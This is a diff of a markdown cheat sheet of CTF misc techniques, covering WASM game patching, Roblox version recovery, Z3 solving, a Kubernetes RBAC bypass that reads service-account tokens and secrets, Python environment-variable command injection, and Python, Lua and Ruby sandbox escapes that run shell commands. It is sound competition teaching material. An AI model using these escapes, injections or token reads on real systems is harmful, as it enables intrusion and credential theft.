@@ -1,7 +1,6 @@
 # CTF Misc - Games, VMs & Constraint Solving (Part 1)
 
 ## Table of Contents
-
 - [WASM Game Exploitation via Patching](#wasm-game-exploitation-via-patching)
 - [Roblox Place File Reversing](#roblox-place-file-reversing)
 - [PyInstaller Extraction](#pyinstaller-extraction)
@@ -27,7 +26,7 @@
 - [Pixel-Sampling BFS Maze Auto-Solver (HackCon 2018)](#pixel-sampling-bfs-maze-auto-solver-hackcon-2018)
 - [References](#references)
 
-------
+---
 
 ## WASM Game Exploitation via Patching
 
@@ -36,7 +35,6 @@
 **Key insight:** If the proof generation depends only on move positions and seed (not on whether moves were optimal), patching the WASM to make the AI play badly produces a beatable game with valid proofs.
 
 **Patching workflow:**
-
 ```bash
 # 1. Convert WASM binary to text format
 wasm2wat main.wasm -o main.wat
@@ -50,7 +48,6 @@ wat2wasm main.wat -o main_patched.wasm
 ```
 
 **Exploitation:**
-
 ```javascript
 const go = new Go();
 const result = await WebAssembly.instantiate(
@@ -69,21 +66,19 @@ const data = GetWinData();
 
 **General lesson:** In client-side game challenges, always check if the verification/proof system is independent of move quality. If so, patch the game logic rather than trying to beat it.
 
-------
+---
 
 ## Roblox Place File Reversing
 
 **Pattern (MazeRunna, 0xFun 2026):** Roblox game where the flag is hidden in an older published version. Latest version contains a decoy flag.
 
 **Step 1: Identify target IDs from game page HTML:**
-
 ```python
 placeId = 75864087736017
 universeId = 8920357208
 ```
 
 **Step 2: Pull place versions via Roblox Asset Delivery API:**
-
 ```bash
 # Requires .ROBLOSECURITY cookie (rotate after CTF!)
 for v in 1 2 3; do
@@ -95,7 +90,6 @@ done
 
 **Step 3: Parse .rbxlbin binary format:**
 The Roblox binary place format contains typed chunks:
-
 - **INST** — defines class buckets (Script, Part, etc.) and referent IDs
 - **PROP** — per-instance property values (including `Source` for scripts)
 - **PRNT** — parent→child relationships forming the object tree
@@ -110,17 +104,15 @@ for chunk in parse_chunks(data):
 ```
 
 **Step 4: Diff script sources across versions.**
-
 - v3 (latest): `Workspace/Stand/Color/Script` → fake flag
 - v2 (older): same path → real flag
 
 **Key lessons:**
-
 - Always check **version history** — latest version may be a decoy
 - Roblox Asset Delivery API exposes all published versions
 - Rotate `.ROBLOSECURITY` cookie immediately after use (it's a full session token)
 
-------
+---
 
 ## PyInstaller Extraction
 
@@ -130,15 +122,13 @@ python pyinstxtractor.py packed.exe
 ```
 
 ### Opcode Remapping
-
 If decompiler fails with opcode errors:
-
 1. Find modified `opcode.pyc`
 2. Build mapping to original values
 3. Patch target .pyc
 4. Decompile normally
 
-------
+---
 
 ## Marshal Code Analysis
 
@@ -150,13 +140,12 @@ dis.dis(code)
 ```
 
 ### Bytecode Inspection Tips
-
 - `co_consts` contains literal values (strings, numbers)
 - `co_names` contains referenced names (function names, variables)
 - `co_code` is the raw bytecode
 - Use `dis.Bytecode(code)` for instruction-level iteration
 
-------
+---
 
 ## Python Environment RCE
 
@@ -166,14 +155,13 @@ BROWSER="/bin/sh -c 'cat /flag' %s"
 ```
 
 **Other dangerous environment variables:**
-
 - `PYTHONSTARTUP` - Script executed on interactive startup
 - `PYTHONPATH` - Inject modules via path hijacking
 - `PYTHONINSPECT` - Drop to interactive shell after script
 
 **How PYTHONWARNINGS works:** Setting `PYTHONWARNINGS=ignore::antigravity.Foo::0` triggers `import antigravity`, which opens a URL via `$BROWSER`. Control `$BROWSER` to execute arbitrary commands.
 
-------
+---
 
 ## Z3 Constraint Solving
 
@@ -186,11 +174,9 @@ s.add(flag[0] == ord('f'))  # Known prefix
 # Add constraints...
 if s.check() == sat:
     print(bytes([s.model()[f].as_long() for f in flag]))
-
 ```
 
 ### YARA Rules with Z3
-
 ```python
 from z3 import *
 
@@ -209,22 +195,18 @@ for i in range(4):
 if s.check() == sat:
     m = s.model()
     print(bytes([m[f].as_long() for f in flag]))
-
 ```
 
 ### Type Systems as Constraints
-
 **OCaml GADTs / advanced types encode constraints.**
 
 Don't compile - extract constraints with regex and solve with Z3:
-
 ```python
 import re
 from z3 import *
 
 matches = re.findall(r"\(\s*([^)]+)\s*\)\s*(\w+)_t", source)
 # Convert to Z3 constraints and solve
-
 ```
 
 ### Z3 SAT Solving for Boolean Logic Gate Networks (BSidesSF 2026)
@@ -265,11 +247,11 @@ for gate_type, in1, in2, out in gates:
 if solver.check() == sat:
     model = solver.model()
     # Extract 125 bits, encode as base32 in 5-bit groups
-    bits = [1 if is_true(model[inputs[i]]) else 0 for i in range(125)]
+    # model_completion=True so unconstrained inputs evaluate to False instead of None
+    bits = [1 if is_true(model.eval(inputs[i], model_completion=True)) else 0 for i in range(125)]
     # Convert to product key format
     key = bits_to_base32(bits)
     print(f"Product key: {key}")
-
 ```
 
 **Key insight:** Boolean logic gate networks are directly expressible as Z3 constraints. Each gate becomes one constraint (`And`, `Or`, `Xor`, `Not`), and the requirement that all outputs are True constrains the solution space. Even with 125 input variables and 250 gates, Z3 solves this in milliseconds. Any "keygen" or "product key" challenge with observable validation logic can be modeled this way.
@@ -278,14 +260,13 @@ if solver.check() == sat:
 
 **References:** BSidesSF 2026 "flag-factory-pro"
 
-------
+---
 
 ## Kubernetes RBAC Bypass
 
 **Pattern (CTFaaS, LACTF 2026):** Container deployer with claimed ServiceAccount isolation.
 
 **Attack chain:**
-
 1. Deploy probe container that reads in-pod ServiceAccount token at `/var/run/secrets/kubernetes.io/serviceaccount/token`
 2. Verify token can impersonate deployer SA (common misconfiguration)
 3. Create pod with `hostPath` volume mounting `/` -> read node filesystem
@@ -297,18 +278,16 @@ if solver.check() == sat:
 TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
 curl -k -H "Authorization: Bearer $TOKEN" \
   https://kubernetes.default.svc/api/v1/namespaces/hidden/secrets/flag
-
 ```
 
 ### K8s Privilege Escalation Checklist
-
 - Check RBAC: `kubectl auth can-i --list`
 - Look for pod creation permissions (can create privileged pods)
 - Check for hostPath volume mounts allowed in PSP/PSA
 - Look for secrets in environment variables of other pods
 - Check for service mesh sidecars leaking credentials
 
-------
+---
 
 ## Floating-Point Precision Exploitation
 
@@ -317,7 +296,6 @@ curl -k -H "Authorization: Bearer $TOKEN" \
 **Key insight:** When decimal values (0.01-0.99) are multiplied by large numbers (e.g., 1e15), floating-point representation errors create fractional remainders that can be exploited.
 
 ### Finding Exploitable Values
-
 ```python
 mult = 1000000000000000  # 10^15
 
@@ -334,17 +312,14 @@ for i in range(1, 100):
 # 0.14 -> 140000000000000.015625
 # 0.27 -> 270000000000000.03125
 # 0.56 -> 560000000000000.0625
-
 ```
 
 ### Exploitation Strategy
-
 1. **Identify the constraint**: Need `balance >= price` AND `inventory >= fee`
 2. **Find favorable FP error**: Value where `x * mult` has positive fraction
 3. **Key trick**: Sell the INTEGER part of inventory, keeping the fractional "free money"
 
 **Example (time-travel trading game):**
-
 ```text
 Initial: balance=5.00, inventory=0.00, flag_price=5.00, fee=0.05
 Multiplier: 1e15 (time travel)
@@ -358,18 +333,15 @@ balance = 4439999999999999.5 + 560000000000000 = 5000000000000000.0 (FP rounds!)
 inventory = 560000000000000.0625 - 560000000000000 = 0.0625 > 0.05 fee
 
 # Now: balance >= flag_price AND inventory >= fee
-
 ```
 
 ### Why It Works
-
 - Float64 has ~15-16 significant digits precision
 - `(5.0 - 0.56) * 1e15` loses precision -> rounds to exact 5e15 when added
 - `0.56 * 1e15` keeps the 0.0625 fraction as "free inventory"
 - The asymmetric rounding gives you slightly more total value than you started with
 
 ### Red Flags in Challenges
-
 - "Time travel amplifies everything" (large multipliers)
 - Trading games with buy/sell + special actions
 - Decimal currency with fees or thresholds
@@ -377,7 +349,6 @@ inventory = 560000000000000.0625 - 560000000000000 = 0.0625 > 0.05 fee
 - Starting values that seem impossible to win with normal math
 
 ### Quick Test Script
-
 ```python
 def find_exploit(mult, balance_needed, inventory_needed):
     """Find x where selling int(x*mult) gives balance>=needed with inv>=needed"""
@@ -401,10 +372,9 @@ def find_exploit(mult, balance_needed, inventory_needed):
 
 # Example usage:
 find_exploit(1e15, 5e15, 0.05)  # Returns 0.56
-
 ```
 
-------
+---
 
 ## Custom Assembly Language Sandbox Escape (EHAX 2026)
 
@@ -413,7 +383,6 @@ find_exploit(1e15, 5e15, 0.05)  # Returns 0.56
 **Key insight:** `PROP` (property access) and `CALL` (function invocation) instructions allow traversing Python's MRO chain from any object to achieve RCE, similar to Jinja2 SSTI.
 
 **Exploit chain:**
-
 ```text
 LD 0x48656c6c6f A     # Load "Hello" string into register A
 PROP __class__ A      # str → <class 'str'>
@@ -432,24 +401,21 @@ PUSH 0x666c61672e747874          # "flag.txt" as hex
 CALL open E                      # open("flag.txt")
 CALL read E                      # read file contents
 STDOUT E                         # print flag
-
 ```
 
 **Filter bypass techniques:**
-
 - **Hex-encoded strings:** `0x666c61672e747874` → `"flag.txt"` bypasses keyword filters
 - **os.popen for shell:** If file path is unknown, use `os.popen('ls /').read()` then `os.popen('cat /flag*').read()`
 - **Subclass index discovery:** Iterate through `__subclasses__()` list to find useful classes (os._wrap_close, subprocess.Popen, etc.)
 
 **General approach for custom language challenges:**
-
 1. **Read the docs:** Check `/docs`, `/help`, `/api` endpoints for instruction reference
 2. **Find the result register:** Many custom languages have a special register for return values
 3. **Test string handling:** Try hex-encoded strings to bypass keyword filters
 4. **Chain Python MRO:** Any Python string object → `__class__.__base__.__subclasses__()` → RCE
 5. **Error messages leak info:** Intentional errors reveal Python internals and available classes
 
-------
+---
 
 ## Lua Sandbox Escape via Function Name Injection (CSAW CTF 2016)
 
@@ -480,12 +446,11 @@ os[cmd]("cat /flag")
 
 -- Bypass 6: Via io library
 io.popen("cat /flag"):read("*a")
-
 ```
 
 **Key insight:** Lua sandboxes typically filter specific function *calls* but not *table lookups*. Access blocked functions through table indexing (`os["execute"]`), string concatenation for function names, or alternate I/O libraries (`io.popen`). Also check if `loadstring` (Lua 5.1 alias for `load`) is unblocked.
 
-------
+---
 
 ## Ruby Sandbox Escape via TracePoint.trace (HITCON 2017)
 
@@ -495,7 +460,6 @@ io.popen("cat /flag"):read("*a")
 TracePoint.trace(:c_call) do |tp|
   system('sh')
 end
-
 ```
 
 The hook fires on the next C-level call (e.g., `puts`, any method call), executing `system('sh')` before the sandbox monitor can intercept it.
@@ -504,14 +468,13 @@ The hook fires on the next C-level call (e.g., `puts`, any method call), executi
 
 **Key insight:** `TracePoint` operates at a lower level than `set_trace_func` in Ruby — C-call hooks fire before Ruby-level event hooks, allowing sandbox escape. Any subsequent C-method call (even benign ones) triggers the payload.
 
-------
+---
 
 ## Pixel-Sampling BFS Maze Auto-Solver (HackCon 2018)
 
 **Pattern:** Challenge streams a PNG of a grid maze and expects the player to type WASD moves within a tight time limit. Manual solving is impossible at scale, but the maze is a uniform grid — each cell is exactly `N` pixels wide and each wall is 1 cell wide.
 
 **Solver pipeline:**
-
 ```python
 import requests, numpy as np
 from collections import deque
@@ -542,7 +505,6 @@ def bfs(grid, start, goal):
                     and grid[nr][nc] == 0 and (nr, nc) not in seen):
                 seen.add((nr, nc))
                 q.append(((nr, nc), path + m))
-
 ```
 
 Measure `CELL` once by inspecting the first row of the image; then every maze in the same challenge series decodes to a boolean grid and BFS yields the move sequence in milliseconds.
@@ -551,10 +513,9 @@ Measure `CELL` once by inspecting the first row of the image; then every maze in
 
 **References:** HackCon 2018 — writeup 10764
 
-------
+---
 
 ## References
-
 - Pragyan 2026 "Tac Tic Toe": WASM minimax patching
 - LACTF 2026 "CTFaaS": K8s RBAC bypass via hostPath
 - 0xL4ugh CTF: PyInstaller + opcode remapping
@@ -562,7 +523,7 @@ Measure `CELL` once by inspecting the first row of the image; then every maze in
 - EHAX 2026 "Chusembly": Custom assembly language with Python MRO chain RCE
 - HITCON 2017: Ruby TracePoint sandbox escape
 
-------
+---
 
 See also: [games-and-vms-2.md](games-and-vms-2.md) for cookie checkpoint brute-forcing, Flask cookie game state leakage, WebSocket game manipulation, server time-only validation bypass, De Bruijn sequences, Brainfuck instrumentation, and WASM memory manipulation.
 
